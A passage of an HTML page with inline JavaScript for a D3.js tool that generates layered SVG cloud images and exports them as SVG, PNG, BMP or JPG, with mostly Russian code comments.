<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>D3.js SVG Clouds Generator</title>
    <script src='/js/d3.v6.min.js'></script>
    <script src='/js/chroma.min.js'></script>
    <script src='/js/lodash.min.js'></script>

    <!--<link rel='stylesheet' href='/css/null.css' />-->

    <link rel='stylesheet' href='/css/bootstrap4-toggle.min.css' />


    <!-- Bootstrap CSS CDN -->
    <link rel="stylesheet" href="/css/bootstrap.min.css" crossorigin="anonymous">
    <!-- Our Custom CSS -->
    <link rel="stylesheet" href="style3.css">
    <!-- Scrollbar Custom CSS -->
    <link rel="stylesheet" href="/css/jquery.mCustomScrollbar.css">

    <style>
        .axis path,
        .axis line {
            fill: none;
            stroke: #333;
        }
        
        .axis .grid-line {
            stroke: #000;
            stroke-opacity: 0.2;
        }
        
        .axis text {
            font: 10px Verdana;
        }
        
        .bar {
            /*stroke: none;*/
        }
        /*
        svg {
            position: absolute;
            top: 0;
            left: 0;
        }
        */
        
        .dot {
            stroke: steelblue;
            fill: lightblue;
        }
        
        .dot-2 {
            /*
            stroke: lightblue;
            fill: lightblue;*/
        }
        /*#canvas,
        svg {
            display: none!important;
        }*/
        /*
        canvas {
            display: block;
        }*/
    </style>


    <script src='/js/f4afbaa213.js' crossorigin='anonymous'></script>


    <script src="/js/jquery.min.js" crossorigin="anonymous"></script>

    <script src="/js/popper.min.js" crossorigin="anonymous"></script>

    <script src="/js/bootstrap.min.js" crossorigin="anonymous"></script>

    <script src="/js/jquery.mCustomScrollbar.concat.min.js"></script>
    <script src='/js/bootstrap4-toggle.min.js'></script>

    <script src='js/lib.js'></script>
    <script src='c.js'></script>

    <script type="text/javascript">
        // https://manos.malihu.gr/jquery-custom-content-scroller/
        $(document).ready(function() {
            $("#sidebar").mCustomScrollbar({
                theme: "minimal"
            });

            $("#content").mCustomScrollbar({
                theme: "minimal",
                autoHideScrollbar: true,
                snapOffset: 3,
                scrollInertia: 100,
                mouseWheel: {
                    deltaFactor: 30
                }
            });

            $('#dismiss, .overlay').on('click', function() {
                $('#sidebar').removeClass('active');
                $('.overlay').removeClass('active');
            });

            $('#sidebarCollapse').on('click', function() {
                $('#sidebar').addClass('active');
                $('.overlay').addClass('active');
                $('.collapse.in').toggleClass('in');
                $('a[aria-expanded=true]').attr('aria-expanded', 'false');
            });

        });
    </script>
    <script src="data.js"></script>
</head>

<body>

    <div class="wrapper container-fluid m-0 p-0">
        <!-- Sidebar  -->
        <nav id="sidebar">
            <div id="dismiss">
                <i class="fas fa-arrow-left"></i>
            </div>

            <div class="container m-0 p-3">

                <h3>Clouds</h3>
                <div class="line"></div>
                <div>
                    <p class="text-light">Edit the filename and click one of the buttons to save image.</p>
                    <div class="input-group mb-3">
                        <div class="input-group-prepend">
                            <span class="input-group-text">Filename</span>
                        </div>
                        <input id="filename" type="text" class="form-control" placeholder="result" value="result">
                    </div>
                    <div class="row">
                        <div class="col">
                            <button type="button" id="btnsavesvg" class="btn btn-light btn-sm mx-auto d-block" style="max-width:55px">SVG</button></div>
                        <div class="col">
                            <button type="button" id="btnsavepng" class="btn btn-light btn-sm mx-auto d-block" style="max-width:55px">PNG</button>
                        </div>
                        <div class="col">
                            <button type="button" id="btnsavebmp" class="btn btn-light btn-sm mx-auto d-block" style="max-width:55px">BMP</button>
                        </div>
                        <div class="col">
                            <button type="button" id="btnsavejpeg" class="btn btn-light btn-sm mx-auto d-block" style="max-width:55px">JPG</button>
                        </div>
                    </div>
                </div>
                <div class="line"></div>
                <h4>Settings</h4>
                <div class="input-group mb-3">
                    <div class="input-group-prepend">
                        <span class="input-group-text" style="min-width:80px;">Width</span>
                    </div>
                    <input type="text" class="form-control">
                </div>
                <div class="input-group mb-3">
                    <div class="input-group-prepend">
                        <span class="input-group-text" style="min-width:80px;">Height</span>
                    </div>
                    <input type="text" class="form-control">
                </div>
            </div>

            <!--<ul class="list-unstyled components">
                <p>Dummy Heading</p>
                <li class="active">
                    <a href="#homeSubmenu" data-toggle="collapse" aria-expanded="false">Home</a>
                    <ul class="collapse list-unstyled" id="homeSubmenu">
                        <li>
                            <a href="#">Home 1</a>
                        </li>
                        <li>
                            <a href="#">Home 2</a>
                        </li>
                        <li>
                            <a href="#">Home 3</a>
                        </li>
                    </ul>
                </li>
                <li>
                    <a href="#">About</a>
                    <a href="#pageSubmenu" data-toggle="collapse" aria-expanded="false">Pages</a>
                    <ul class="collapse list-unstyled" id="pageSubmenu">
                        <li>
                            <a href="#">Page 1</a>
                        </li>
                        <li>
                            <a href="#">Page 2</a>
                        </li>
                        <li>
                            <a href="#">Page 3</a>
                        </li>
                    </ul>
                </li>
                <li>
                    <a href="#">Portfolio</a>
                </li>
                <li>
                    <a href="#">Contact</a>
                </li>
            </ul>-->


            <!--<ul class="list-unstyled CTAs">
                <li>
                    <a href="https://bootstrapious.com/tutorial/files/sidebar.zip" class="download">Download source</a>
                </li>
                <li>
                    <a href="https://bootstrapious.com/p/bootstrap-sidebar" class="article">Back to article</a>
                </li>
            </ul>-->
        </nav>

        <!-- Page Content  -->
        <div id="content" class="container-fluid m-0 p-0">
            <button type="button" id="sidebarCollapse" class="btn btn-primary btn-float">
                        <i class="fas fa-arrow-right"></i>
                    </button>
            <!--					
            <nav class="navbar navbar-expand-lg navbar-light bg-light">
                <div class="container-fluid">

                    <button type="button" id="sidebarCollapse" class="btn btn-info">
                        <i class="fas fa-align-left"></i>
                        <span>Toggle Sidebar</span>
                    </button>
                    <button class="btn btn-dark d-inline-block d-lg-none ml-auto" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                        <i class="fas fa-align-justify"></i>
                    </button>

                    <div class="collapse navbar-collapse" id="navbarSupportedContent">
                        <ul class="nav navbar-nav ml-auto">
                            <li class="nav-item active">
                                <a class="nav-link" href="#">Page</a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="#">Page</a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="#">Page</a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="#">Page</a>
                            </li>
                        </ul>
                    </div>

                </div>
            </nav>
-->

            <!-- SVG put here -->
            <div id='canvas' style='max-width:100%;height:100%;'></div>
            <div id='prepare' style='max-width:100%;height:0;'></div>



            <!--
            <div style="max-width:100vw;max-height:100vh;z-index:10;">
                <img src="http://placehold.it/1920x1080/" style="max-width:100%!important;max-height:100%!important;">
            </div>
-->

        </div>
    </div>

    <div class="overlay"></div>

    <!-- 1 -->
    <div class="modal fade" id="modalsave">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">

                <!-- Modal Header -->
                <div class="modal-header">
                    <h4 id="ModalTitle" class="modal-title">Save Image</h4>
                    <button type="button" class="close" data-dismiss="modal">×</button>
                </div>

                <!-- Modal body -->
                <div id="saveimg" class="modal-body text-center container">
                    <div id='result' style='max-width:100%;height:100%;' class="mx-auto d-block"></div>
                    <p>Click thumbnail to save image</p>
                </div>

                <!-- Modal footer -->
                <div class="modal-footer">
                    <button type="button" class="btn btn-cancel" data-dismiss="modal">Cancel</button>
                </div>

            </div>
        </div>
    </div>
    <script>
        //
        // создание графического файла
        //

        let createImage = (svg, width, height, type = 'png', filename = 'result', divresultId = '#result', divprepareId = '#prepare') => {
            d3.select(divresultId).html('');
            d3.select(divprepareId).html('');

            if (type == 'svg') {
                let source = (new XMLSerializer()).serializeToString(svg);

                let svg64 = btoa(source);
                let b64Start = 'data:image/svg+xml;base64,';

                let image64 = b64Start + svg64;

                let a = d3.select(divresultId)
                    .append('a')
                    .attr('id', 'resultlink')
                    .node();
                a.href = image64;
                a.title = filename;
                a.download = filename + '.svg';

                let imgresult = d3.select('#resultlink')
                    .append('img')
                    .attr('id', 'img_result')
                    .attr('name', filename)
                    .attr('title', filename)
                    .style('max-width', '100%')
                    .style('max-height', '100%')
                    .node();

                imgresult.src = image64;
                /*
                var svg = document.getElementById("svg");
                var serializer = new XMLSerializer();
                var source = serializer.serializeToString(svg);
                if(!source.match(/^<svg[^>]+xmlns="http\:\/\/www\.w3\.org\/2000\/svg"/)){
                    source = source.replace(/^<svg/, '<svg xmlns="http://www.w3.org/2000/svg"');
                }
                if(!source.match(/^<svg[^>]+"http\:\/\/wwww\.w3\.org/1999\/xlink"/)){
                    source = source.replace(/^<svg/, '<svg xmlns:xlink="http://www.w3.org/1999/xlink"')
                }
                source = '<?xml version="1.0" standalone="no"?>\r\n' + source;
                var url = "data:image/svg+xml;charset=utf-8,"+encodeURIComponent(source);
                document.getElementById("link").href = url;
                */
            } else {
                let imgid;
                let canvasid;
                let canvasimgUrl;
                let imagetype;
                let fname;
                if (type == 'png') {
                    imgid = 'img_png';
                    canvasid = 'canvaspng';
                    imagetype = 'image/png';
                    fname = filename + '.png';
                }
                if (type == 'bmp') {
                    imgid = 'img_bmp';
                    canvasid = 'canvasbmp';
                    imagetype = 'image/bmp';
                    fname = filename + '.bmp';
                }
                if (type == "jpeg") {
                    imgid = "img_jpeg";
                    canvasid = 'canvasjpeg';
                    imagetype = 'image/jpeg';
                    fname = filename + '.jpg';
                }
                //let canvaspngUrl;

                const doctype = '<?xml version="1.0" standalone="no"?>' +
                    //'<?xml-stylesheet type="text/css" href="banner.css"?>' +
                    '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">';

                // сериализуем наш SVG XML в строку.
                const source = (new XMLSerializer()).serializeToString(svg);

                // создаём файл - пузырь нашего SVG.
                const blob = new Blob([doctype + source], {
                    type: 'image/svg+xml;charset=utf-8'
                });

                const url = window.URL.createObjectURL(blob);

                // Помещаем svg между тэгами картинки так, чтобы элемент Canvas мог его прочитать.
                const img = d3.select(divprepareId)
                    .append('img')
                    .attr('width', width)
                    .attr('height', height)
                    .attr('id', imgid)
                    .node();

                img.onload = function() {
                        // Когда картинка загружена помещаем картинку в элемент Canvas.
                        const canvasimg = d3.select(divprepareId)
                            .append('canvas')
                            .attr('id', canvasid)
                            .style('margin', '0 auto')
                            .node();

                        canvasimg.width = width;
                        canvasimg.height = height;

                        const ctximg = canvasimg.getContext('2d');

                        ctximg.drawImage(img, 0, 0);

                        canvasimgUrl = canvasimg.toDataURL(imagetype);

                        let a = d3.select(divresultId)
                            .append('a')
                            .attr('id', 'resultlink')
                            .node();
                        a.href = canvasimgUrl;
                        a.title = filename;
                        a.download = fname;

                        const imgresult = d3.select('#resultlink')
                            .append('img')
                            .attr('id', 'img_result')
                            .attr('name', filename)
                            .attr('title', filename)
                            .style('max-width', '100%')
                            .style('max-height', '100%')
                            .node();

                        imgresult.src = canvasimgUrl;
                        //window.location.href = canvaspngUrl;

                        canvasimg.width = 0;
                        canvasimg.height = 0;

                        //imgresult.width=0;
                        //imgresult.height=0;

                    }
                    // Начало загрузки картинки.
                img.src = url;
                img.width = 0;
                img.height = 0;
            }
        };
        /*
        // stackoverflow.com/questions/50537735/convert-blob-to-image-file

        // How to conver the file to a blob (binary file) and upload it to the server
        // This function is used to convert base64 encoding to mine type (blob)
        function base64ToBlob(base64,mine) {
            mine = mime || '';
            let sliceSize = 1024;
            let byteChars = window.atob(base64);
            let byteArrays = [];

            for (let offset = 0; len = byteChars.length; offset<len;offset+=sliceSize) {
                let slice = byteChars.slice(offset,offset+sliceSize);
                
                let byteNumbers = new Array(slice.length);
                for (let i=0; i<slice.length; i++) {
                    byteNumbers[i] = slice.chartCodeAt(i);
                }
                var byteArray = new Uint8Array(byteNumbers);

                byteArrays.push(byteArray);
            }

            return new Blob(byteArrays, {type: mime})
        }

        // Now clean the base64 up and then pass it into the function above:

        var jpegFile64 = jpegFile.replace(/^data:image\/(png|jpeg);base64,/,"");
        var jpegBlob = base64ToBlob(jpegFile64,'image/jpeg');

        // Now send the 'jpegBlob' with ajax
        var oReq = new XMLHttpRequest();
        oReq.open("POST", url, true);
        oReq.onLoad = function (oEvent) {
            // Uploaded.
        };

        oReq.send(jpegBlob);


        */

        //width='3840' height='2160'

        //  //  //  //  //  //  //  //  //  //  //  //
        //
        //  //  //  //  //  //  //  //  //  //  //  //

        let Layer = (spec) => {
            let instance = {};
            let id, g;
            let maxX,
                maxY;
            let data, width, height, margin, fill, stroke;
            let parent;

            if (_.isEmpty(spec)) {
                id = 'id_l_' + Date.now();
                width = globalwidth;
                height = globalheight;
                margin = 0;
                fill = 'white';
                stroke = 'white';

                // 1920x1080 / 10
                maxX = 192;
                maxY = 108;
            } else {
                if (_.isEmpty(spec.id)) {
                    id = 'id_l_' + Date.now();
                } else {
                    id = spec.id;
                }
                if (!_.isEmpty(spec.g)) g = spec.g;
                if (!_.isEmpty(spec.data)) data = spec.data;
                if (_.isEmpty(spec.maxX)) {
                    maxX = 192;
                } else {
                    maxX = spec.maxX;
                }
                if (_.isEmpty(spec.maxY)) {
                    maxY = 108;
                } else {
                    maxY = spec.maxY;
                }
                if (_.isEmpty(spec.width)) {
                    width = globalwidth;
                } else {
                    width = spec.width;
                }
                if (_.isEmpty(spec.height)) {
                    height = globalheight;
                } else {
                    height = spec.height;
                }
                if (_.isEmpty(spec.margin)) {
                    margin = '0';
                } else {
                    margin = spec.margin;
                }
                if (_.isEmpty(spec.fill)) {
                    fill = 'white';
                } else {
                    fill = spec.fill;
                }
                if (_.isEmpty(spec.stroke)) {
                    stroke = 'white';
                } else {
                    stroke = spec.stroke;
                }

                if (!_.isEmpty(spec.parent)) parent = spec.parent;
            }
            // присваиваем или получаем Id
            instance.id = (i) => {
                if (_.isEmpty(i)) {
                    return id.toString();
                }
                id = i;
                return instance;
            };

            // присваиваем или получаем g
            instance.g = (v) => {
                if (_.isEmpty(v)) {
                    return g;
                }
                g = v;
                return instance;
            };

            // присваиваем или получаем data
            instance.data = (d) => {
                if (_.isEmpty(d)) {
                    return data;
                }
                data = d;
                return instance;
            };

            // присваиваем или получаем maxX
            instance.maxX = (x) => {
                if (typeof(x) == 'number') {
                    x = x.toString();
                }
                if (_.isEmpty(x)) {
                    return maxX;
                }
                maxX = x;
                return instance;
            };

            // присваиваем или получаем maxY
            instance.maxY = (y) => {
                if (typeof(y) == 'number') {
                    y = y.toString();
                }
                if (_.isEmpty(y)) {
                    return maxY;
                }
                maxY = y;
                return instance;
            };

            // присваиваем или получаем width
            instance.width = (w) => {
                if (typeof(w) == 'number') {
                    w = w.toString();
                }
                if (_.isEmpty(w)) {
                    return width;
                }
                width = w;
                return instance;
            };

            // присваиваем или получаем height
            instance.height = (h) => {
                if (typeof(h) == 'number') {
                    h = h.toString();
                }
                if (_.isEmpty(h)) {
                    return height;
                }
                height = h;
                return instance;
            };

            // присваиваем или получаем margin
            instance.margin = (m) => {
                if (_.isEmpty(m) && m != 0) {
                    return margin;
                }
                margin = m;
                return instance;
            };

            // присваиваем или получаем parent
            instance.parent = (p) => {
                if (_.isEmpty(p)) {
                    return parent;
                }
                parent = p;
                return instance;
            };

            // присваиваем или получаем fill
            instance.fill = (f) => {
                if (_.isEmpty(f)) {
                    return fill;
                }
                fill = f;
                return instance;
            };

            // присваиваем или получаем stroke
            instance.stroke = (s) => {
                if (_.isEmpty(s)) {
                    return stroke;
                }
                stroke = s;
                return instance;
            };

            instance.append = (p) => {

                if (!_.isEmpty(p)) {
                    parent = p;
                }

                g = parent.append('g')
                g.attr('id', id);
                g.attr("transform", // сдвиг слоя вправо
                    "translate(" + margin + ", 0 )");

                return instance;
            }

            instance.appendArea = (a) => {

                if (_.isEmpty(a)) {
                    a = data;
                }

                let linedots = interpolate(a);
                let area = Path()
                    .d(Area(linedots, height, margin))
                    .fill(fill)
                    .append(g);

                return instance;
            };

            instance.appendLine = (l) => {
                if (_.isEmpty(l)) {
                    l = data;
                }
                let linedots = interpolate(l);
                let line = Path()
                    .d(Line(linedots))
                    .stroke(stroke)
                    .strokewidth(2)
                    .fill('none')
                    .append(g);

                return instance;
            };

            instance.appendDots = (d) => {
                if (_.isEmpty(d)) {
                    d = data;
                }

                let linedots = interpolate(d);
                let dots = Dots()
                    .data(d)
                    .cls('dot-2')
                    .scaleX(scaleX)
                    .scaleY(scaleY)
                    .fill(fill)
                    .stroke(stroke)
                    .strokewidth(2)
                    .append(g);

                return instance;
            };

            let interpolate = (data) => {
                // длина оси X= ширина слоя - отступ слева и справа
                xAxisLength = AxisLength(width, margin);
                // длина оси Y = высота слоя - отступ сверху и снизу
                yAxisLength = AxisLength(height, margin);
                // функция интерполяции значений на ось X
                scaleX = AxisScale(xAxisLength, [0, maxX]); // 1920x1080
                // функция интерполяции значений на ось Y
                scaleY = AxisScale(yAxisLength, [maxY, 0]); // 1920x1080
                // расположение точек линии с учетом интерполяции
                return LineDots(data, scaleX, scaleY, margin);
            };

            return instance;
        }

        let ExtendedLayer = (spec) => {
            // Маскированный слой
            // Свойства должны совпадать с layers
            // За некоторыми исключениями или в layers добавить пустые свойства

            let instance = {};

            let layer; // Ссылка на обычный слой
            let m; // Ссылка на маску

            let id, g;

            let maxX,
                maxY;

            let defs; // Добавить ссылку на defs
            let rect;
            let data, width, height, margin, fill, stroke;

            let maskfill; // Добавить в свойства
            let maskstroke; // Добавить в свойства

            let area = false;
            let line = false;
            let dots = false;

            let parent;

            if (_.isEmpty(spec)) {
                id = 'id_l_' + Date.now();
                width = globalwidth;
                height = globalheight;
                margin = 0;
                fill = 'white';
                stroke = 'white';

                // 1920x1080 / 10
                maxX = 192;
                maxY = 108;
            } else {
                if (_.isEmpty(spec.id)) {
                    id = 'id_l_' + Date.now();
                } else {
                    id = spec.id;
                }
                if (!_.isEmpty(spec.g)) g = spec.g;
                if (!_.isEmpty(spec.defs)) defs = spec.defs;
                if (!_.isEmpty(spec.rect)) rect = spec.rect;
                if (!_.isEmpty(spec.data)) data = spec.data;
                if (_.isEmpty(spec.maxX)) {
                    maxX = 192;
                } else {
                    maxX = spec.maxX;
                }
                if (_.isEmpty(spec.maxY)) {
                    maxY = 108;
                } else {
                    maxY = spec.maxY;
                }
                if (_.isEmpty(spec.width)) {
                    width = globalwidth;
                } else {
                    width = spec.width;
                }
                if (_.isEmpty(spec.height)) {
                    height = globalheight;
                } else {
                    height = spec.height;
                }
                if (_.isEmpty(spec.margin)) {
                    margin = '0';
                } else {
                    margin = spec.margin;
                }
                if (_.isEmpty(spec.fill)) {
                    fill = 'white';
                } else {
                    fill = spec.fill;
                }
                if (_.isEmpty(spec.stroke)) {
                    stroke = 'white';
                } else {
                    stroke = spec.stroke;
                }
                if (!_.isEmpty(spec.maskfill)) maskfill = spec.maskfill;
                if (!_.isEmpty(spec.maskstroke)) maskstroke = spec.maskstroke;

                if (!_.isEmpty(spec.parent)) parent = spec.parent;
            }

            // присваиваем или получаем Id
            instance.id = (i) => {
                if (_.isEmpty(i)) {
                    return id.toString();
                }
                id = i;
                return instance;
            };

            // присваиваем или получаем g
            instance.g = (v) => {
                if (_.isEmpty(v)) {
                    return g;
                }
                g = v;
                return instance;
            };

            // присваиваем или получаем defs
            instance.defs = (d) => {
                if (_.isEmpty(d)) {
                    return defs;
                }
                defs = d;
                return instance;
            };

            // присваиваем или получаем rect
            instance.rect = (r) => {
                if (_.isEmpty(r)) {
                    return rect;
                }
                rect = r;
                return instance;
            };

            // присваиваем или получаем data
            instance.data = (d) => {
                if (_.isEmpty(d)) {
                    return data;
                }
                data = d;
                return instance;
            };

            // присваиваем или получаем maxX
            instance.maxX = (x) => {
                if (typeof(x) == 'number') {
                    x = x.toString();
                }
                if (_.isEmpty(x)) {
                    return maxX;
                }
                maxX = x;
                return instance;
            };

            // присваиваем или получаем maxY
            instance.maxY = (y) => {
                if (typeof(y) == 'number') {
                    y = y.toString();
                }
                if (_.isEmpty(y)) {
                    return maxY;
                }
                maxY = y;
                return instance;
            };

            // присваиваем или получаем width
            instance.width = (w) => {
                if (typeof(w) == 'number') {
                    w = w.toString();
                }
                if (_.isEmpty(w)) {
                    return width;
                }
                width = w;
                return instance;
            };

            // присваиваем или получаем height
            instance.height = (h) => {
                if (typeof(h) == 'number') {
                    h = h.toString();
                }
                if (_.isEmpty(h)) {
                    return height;
                }
                height = h;
                return instance;
            };

            // присваиваем или получаем margin
            instance.margin = (m) => {
                if (_.isEmpty(m) && m != 0) {
                    return margin;
                }
                margin = m;
                return instance;
            };

            // присваиваем или получаем parent
            instance.parent = (p) => {
                if (_.isEmpty(p)) {
                    return parent;
                }
                parent = p;
                return instance;
            };

            // присваиваем или получаем fill
            instance.fill = (f) => {
                if (_.isEmpty(f)) {
                    return fill;
                }
                fill = f;
                return instance;
            };

            // присваиваем или получаем stroke
            instance.stroke = (s) => {
                if (_.isEmpty(s)) {
                    return stroke;
                }
                stroke = s;
                return instance;
            };

            // присваиваем или получаем maskfill
            instance.maskfill = (m) => {
                if (_.isEmpty(m)) {
                    return maskfill;
                }
                maskfill = m;
                return instance;
            };

            // присваиваем или получаем maskstroke
            instance.maskstroke = (m) => {
                if (_.isEmpty(m)) {
                    return maskstroke;
                }
                maskstroke = m;
                return instance;
            };

            // присваиваем или получаем area
            instance.area = (a) => {
                if (_.isEmpty(a)) {
                    return area;
                }
                area = a;
                return instance;
            };

            // присваиваем или получаем line
            instance.line = (l) => {
                if (_.isEmpty(l)) {
                    return line;
                }
                line = l;
                return instance;
            };

            // присваиваем или получаем dots
            instance.dots = (d) => {
                if (_.isEmpty(d)) {
                    return dots;
                }
                dots = d;
                return instance;
            };

            instance.append = (p) => {
                if (!_.isEmpty(p)) {
                    parent = p;
                }
                m = Mask()
                    .append(defs); //defs - родитель для обычного слоя
                layer = Layer()
                    .maxX(maxX)
                    .maxY(maxY)
                    .data(data)
                    .width(width).height(height)
                    .margin(margin)
                    .fill(maskfill)
                    .stroke(maskstroke)
                    .append(m.d3());
                if (area) layer.appendArea();
                if (line) layer.appendLine();
                if (dots) layer.appendDots();
                rect = Rect({
                    'width': width,
                    'height': height,
                    'fill': fill,
                    'stroke': stroke,
                    'mask': m.url()
                }).append(parent); // соотношение с defs, parent, svg

                return instance;
            }

            instance.appendArea = (a) => {
                if (_.isEmpty(a)) {
                    a = data;
                }
                layer.appendArea(a);

                return instance;
            };

            instance.appendLine = (l) => {
                if (_.isEmpty(l)) {
                    l = data;
                }
                layer.appendLine(l);

                return instance;
            };

            instance.appendDots = (d) => {
                if (_.isEmpty(d)) {
                    d = data;
                }
                layer.appendDots(d);

                return instance;
            };

            return instance;
        };

        win.onload = () => {

            let width = globalwidth;
            let height = globalheight;

            let margin = 0,
                padding = 0;


            //https://mdigi.tools/color-shades/#061639
            //#061639
            //let pallete = chroma.scale(['#061639', 'black']).colors(24);
            let palletejson = JSON.stringify(colors);



            // объект Холст
            function Canvas(spec) {
                let instance = {};
                let headline, description;
                let svg, defs, width, height;
                let maxX = 192,
                    maxY = 108; // 1920x1080 / 10
                let data = {};
                let margin = 0;
                let pallete = [];
                let gradients = [];
                let layers = [];
                let extendedlayers = []; // объединить с layers
                let rects = []; // удалить после объединения с layers

                instance.newLayer = (data, width, height, margin, fill, stroke) => {

                    let layer = Layer()
                        .maxX(maxX).maxY(maxY)
                        .data(data)
                        .width(width).height(height)
                        .margin(margin)
                        .fill(fill)
                        .stroke(stroke)
                        .append(svg)
                        .appendArea()
                        .appendLine()
                        .appendDots();

                    layers.push(layer);

                    return instance;
                };

                // объединить c newLayer
                instance.newExtendedLayer = (data, width, height, margin, fill, stroke, maskfill, maskstroke, spec) => {

                    let m = Mask()
                        .append(defs);

                    let layer = Layer()
                        .maxX(maxX).maxY(maxY)
                        .data(data)
                        .width(width).height(height)
                        .margin(margin)
                        .fill(maskfill)
                        .stroke(maskstroke)
                        .append(m.d3())
                    if (_.isEmpty(spec)) {
                        layer.appendArea();
                        layer.appendLine();
                        layer.appendDots();
                    } else {
                        if (spec.area) layer.appendArea();
                        if (spec.line) layer.appendLine();
                        if (spec.dots) layer.appendDots();
                    }
                    extendedlayers.push(m);

                    let r = Rect({
                        'width': width,
                        'height': height,
                        'fill': fill,
                        'stroke': stroke,
                        'mask': m.url()
                    }).append(svg);

                    //rects.push(r);

                    return instance;
                }

                instance.newExtendedLayerV2 = (data, width, height, margin, fill, stroke, maskfill, maskstroke, spec) => {

                    let extended = ExtendedLayer()
                        .maxX(maxX).maxY(maxY)
                        .data(data)
                        .width(width).height(height)
                        .margin(margin)
                        .fill(fill).stroke(stroke)
                        .maskfill(maskfill).maskstroke(maskstroke)
                        .defs(defs)
                        .append(svg);
                    if (_.isEmpty(spec)) {
                        extended.appendArea();
                        extended.appendLine();
                        extended.appendDots();
                    } else {
                        if (spec.area) extended.appendArea();
                        if (spec.line) extended.appendLine();
                        if (spec.dots) extended.appendDots();
                    }

                    extendedlayers.push(extended);

                    return instance;
                }


                // создаем SVG
                instance.appendSvg = (w, h) => {
                    width = w;
                    height = h;
                    svg = d3.select("#canvas")
                        .append("svg")
                        .attr('id', 'svgcanvas')
                        .style('max-width', '100%')
                        .style('max-height', '100%')
                        .attr("class", "axis w-100")
                        .attr("viewBox", "0 0 " + width + " " + height);
                    //.attr("width", width) //win.innerWidth)
                    //.attr("height", height); //win.innerHeight);
                    defs = svg.append("defs");
                    return instance;
                };

                instance.onresize = (on) => {
                    if (on) {
                        win.onresize = () => {
                            //svg.attr("width", width); //win.innerWidth);
                            //svg.attr("height", height); //win.innerHeight);
                        };
                    } else {
                        win.onresize = () => {};
                    }

                    return instance;
                }

                // создаем defs
                instance.appendDefs = () => {
                    if (!svg.select("defs")) defs = svg.append("defs");
                    return instance;
                };

                // присваиваем или получаем SVG
                instance.svg = (s) => {
                    if (!arguments.length) return svg;
                    svg = s;
                    return instance;
                };

                // устанавливаем или получаем ширину margin
                instance.margin = (m) => {
                    if (!arguments.length) return margin;
                    margin = m;
                    return instance;
                };

                // устанавливаем или получаем ширину SVG
                instance.width = (w) => {
                    if (!arguments.length) return width;
                    width = w;
                    svg.attr("viewBox", "0 0 " + width + " " + height);
                    //.attr('width', win.innerWidth);
                    return instance;
                };

                // устанавливаем или получаем высоту SVG
                instance.height = (h) => {
                    if (!arguments.length) return height;
                    height = h;
                    svg.attr("viewBox", "0 0 " + width + " " + height);
                    //.attr('height', win.innerHeight);
                    return instance;
                };

                // устанавливаем или получаем maxX
                instance.maxX = (x) => {
                    if (!arguments.length) return maxX;
                    maxX = x;

                    return instance;
                };

                // устанавливаем или получаем maxX
                instance.maxY = (y) => {
                    if (!arguments.length) return maxY;
                    maxY = Y;

                    return instance;
                };

                // выводим виджет с заголовком и описанием
                instance.showTextWidget = () => {
                    let div = d3.select('body').append('div');
                    div.append('h3').text(headline);
                    div.attr('class', 'box')
                        .attr('style', 'width: ' + spec.width + '; word-wrap: break-word;color:' + spec.color)
                        .append('p')
                        .text(description);
                    return instance;
                };

                // присваиваем и получаем заголовок виджета
                instance.headline = (h) => {
                    if (!arguments.length) return headline;
                    headline = h;
                    return instance;
                };

                // присваиваем и получаем описание виджета
                instance.description = (d) => {
                    if (!arguments.length) return description;
                    description = d;
                    return instance;
                };

                // присваиваем и получаем объект с данными
                instance.data = (d) => {
                    if (_.isEmpty(d)) return data;
                    data = d;
                    return instance;
                };

                // присваиваем и получаем цветовую палитру
                instance.pallete = (p) => {
                    if (_.isEmpty(p)) return pallete;
                    pallete = p;
                    return instance;
                };

                // присваиваем и получаем градиенты
                instance.gradients = (g) => {
                    if (_.isEmpty(g)) return gradients;
                    gradients = g;
                    return instance;
                };

                // присваиваем и получаем слои
                instance.layers = (l) => {
                    if (_.isEmpty(l)) return layers;
                    layers = l;
                    return instance;
                };

                // создаем палитру
                instance.generatePallete = (obj) => {
                    // obj.colors is an array of colors. Example ['yellow','lightgreen',l008ae5]
                    // obj.domain is an array of stops. Example ['0,0.5,1']
                    let _colors;

                    if (!_.isEmpty(obj.colors)) {
                        _colors = chroma.scale(obj.colors);
                    } else {
                        _colors = chroma.scale(['white', 'black']);
                    }

                    if (!_.isEmpty(obj.domain)) {
                        _colors = _colors.domain(obj.domain);
                    }

                    if (!_.isEmpty(obj.count)) {
                        _colors = _colors.colors(count);
                    } else {
                        _colors = _colors.colors(24);
                    }

                    pallete = _colors;

                    return instance;
                };

                instance.appendGradient = (G) => {
                    G.append(defs);
                    return instance;
                };

                instance.appendBG = (mainColor, gradientColor) => {

                    // градиент
                    let BG = Gradient({
                            'defs': defs
                        }).append()
                        .stop('0', gradientColor, '0.25')
                        .stop('1', gradientColor, '1');

                    // маска
                    let M = Mask({
                            'defs': defs
                        }).append()
                        .rect(0, 0, width, height, 'url(#' + BG.id() + ')');

                    // прямоугольник с маской градиентом
                    let R = Rect({
                        'width': width,
                        'height': height,
                        'fill': mainColor,
                        'mask': 'url(#' + M.id() + ')'
                    }).append(svg);

                    return instance;
                }

                return instance;
            }

            let firstCloudsOn = false;
            let secondCloudsOn = false;
            let thirdCloudsOn = true;

            const firstClouds = ((enabled) => {
                if (enabled) {
                    // Создание картинки
                    let canvas = Canvas({
                            color: 'white', //'#6495ed',
                            width: width
                        })
                        .generatePallete({
                            'colors': ['white', 'darkblue']
                        });
                    let p = canvas.pallete();

                    canvas
                        .headline('Pallete')
                        .description(JSON.stringify(p)) //palletejson)
                        .appendSvg(width, height)
                        .onresize(true)
                        .appendDefs();

                    // canvas.showTextWidget();

                    // html цвета
                    // rapidtables.com/web/color/html-color-codes.html
                    // https://www.w3schools.com/colors/colors_names.asp
                    // https://colorscheme.ru/html-colors.html
                    // https://colorscheme.ru/color-names.html

                    let BackData = [{
                        x: 0,
                        y: 0
                    }, {
                        x: 0,
                        y: 109
                    }, {
                        x: 192,
                        y: 109
                    }, {
                        x: 192,
                        y: 0
                    }];

